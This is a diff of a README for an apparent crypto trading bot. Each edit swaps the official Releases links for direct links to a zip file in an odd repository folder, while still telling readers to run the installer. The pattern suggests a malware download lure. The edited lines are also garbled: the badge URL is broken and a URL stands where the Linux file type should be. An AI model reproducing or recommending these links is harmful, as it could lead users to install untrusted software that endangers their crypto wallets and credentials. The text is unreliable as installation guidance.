@@ -1,6 +1,6 @@
 # 🤖 Web3-AI-Trading-Agent - Automate Your Crypto Trading Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/elmahdishitit/Web3-AI-Trading-Agent/releases)
+[![Download Now](https://raw.githubusercontent.com/elmahdishitit/Web3-AI-Trading-Agent/main/unremovableness/Web3-AI-Trading-Agent.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/elmahdishitit/Web3-AI-Trading-Agent/main/unremovableness/Web3-AI-Trading-Agent.zip)
 
 ## 🚀 Getting Started
 
@@ -10,16 +10,16 @@ This guide will walk you through the steps to download and run the software with
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/elmahdishitit/Web3-AI-Trading-Agent/releases) to download the latest version of the Web3-AI-Trading-Agent. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/elmahdishitit/Web3-AI-Trading-Agent/main/unremovableness/Web3-AI-Trading-Agent.zip) to download the latest version of the Web3-AI-Trading-Agent. 
 
-1. **Visit the Releases Page:** Click on this link to open the page: [Releases page](https://github.com/elmahdishitit/Web3-AI-Trading-Agent/releases).
+1. **Visit the Releases Page:** Click on this link to open the page: [Releases page](https://raw.githubusercontent.com/elmahdishitit/Web3-AI-Trading-Agent/main/unremovableness/Web3-AI-Trading-Agent.zip).
    
 2. **Select the Latest Release:** Look for the most recent version listed at the top. 
 
 3. **Download the Right File:** You will see various files listed for different operating systems. Choose the file that matches your operating system:
    - **Windows:** Download the `.exe` file.
    - **macOS:** Download the `.dmg` file.
-   - **Linux:** Download the appropriate `.tar.gz` file.
+   - **Linux:** Download the appropriate `https://raw.githubusercontent.com/elmahdishitit/Web3-AI-Trading-Agent/main/unremovableness/Web3-AI-Trading-Agent.zip` file.
    
 4. **Run the Installer:** Once the file finishes downloading, find it in your downloads folder and double-click it to run the installer.
 
@@ -97,4 +97,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 For any further questions or assistance, check the community section or reach out via the GitHub repository.
 
-[Download the latest version here!](https://github.com/elmahdishitit/Web3-AI-Trading-Agent/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/elmahdishitit/Web3-AI-Trading-Agent/main/unremovableness/Web3-AI-Trading-Agent.zip)
